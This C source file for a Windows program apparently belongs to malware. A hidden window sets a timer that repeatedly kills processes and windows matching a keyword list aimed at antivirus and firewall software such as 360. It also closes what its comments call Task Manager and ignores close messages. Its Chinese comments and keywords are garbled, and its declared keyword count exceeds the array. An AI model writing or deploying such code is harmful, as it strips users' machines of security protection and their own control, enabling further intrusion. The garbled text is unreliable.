#include "common.h"
#define K_SAFE 1
#define KEY_WORD_NUM 13
const WCHAR* KeyWord[] = { L"ZhuDong",L"����",L"����",L"�Ż�",L"ע���",L"����",L"��",L"ľ��",L"����",L"����ǽ" ,L"360",L"�ܼ�" };
#pragma comment(lib,"Shlwapi.lib")

// ����Ҫ����ǰ������  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
);


// ������ڵ�  
int CALLBACK WinMain(
	_In_  HINSTANCE hInstance,
	_In_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
)
{
#if INFO
	AllocConsole();
#endif
	WinInit((const wchar_t*)lpCmdLine, hInstance, WindowProc);
	// ��Ϣѭ�� 
#if INFO
	freopen("CONOUT$", "w", stdout);
	printf("INFO:��Ϣѭ����ʼ\n");
#endif
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
#if INFO
	FreeConsole();
#endif
	return 0;
}
// ��WinMain��ʵ��  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
)
{
	switch (uMsg)
	{
	//��ֹ����ر�
	case WM_DESTROY:
		break;
	case WM_CLOSE:
		break;
	case WM_CREATE:
		SetTimer(hwnd, 1, 100, NULL);
		SetTimer(hwnd, 2, 300000, NULL);
		break;
	case WM_TIMER:
	{
		if (wParam == 1)
		{
			if (K_SAFE)
			{
#if INFO
				//ת��Ϊchar
				//char buf[1024];
				//WideCharToMultiByte(CP_ACP, 0, lujing, -1, buf, sizeof(buf), NULL, NULL);
				freopen("CONOUT$", "w", stdout);
				printf("INFO:�ر�ɱ�����\n");
#endif
				KillSoftWareByWindow(KeyWord, KEY_WORD_NUM);
				KillSoftWareByProcess(KeyWord, KEY_WORD_NUM);
				
				//ͨ����鴰�ڱ��� ��windows �����������,����Ƿ���windows�������������
				//�ر����������
				if (FindWindow(NULL, TEXT("Windows ���������")) != NULL)
					PostMessage(FindWindow(NULL, TEXT("Windows ���������")), WM_DESTROY, 0, 0);
			}	
		}
		
		break;
	}
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
		break;
	}
	
}

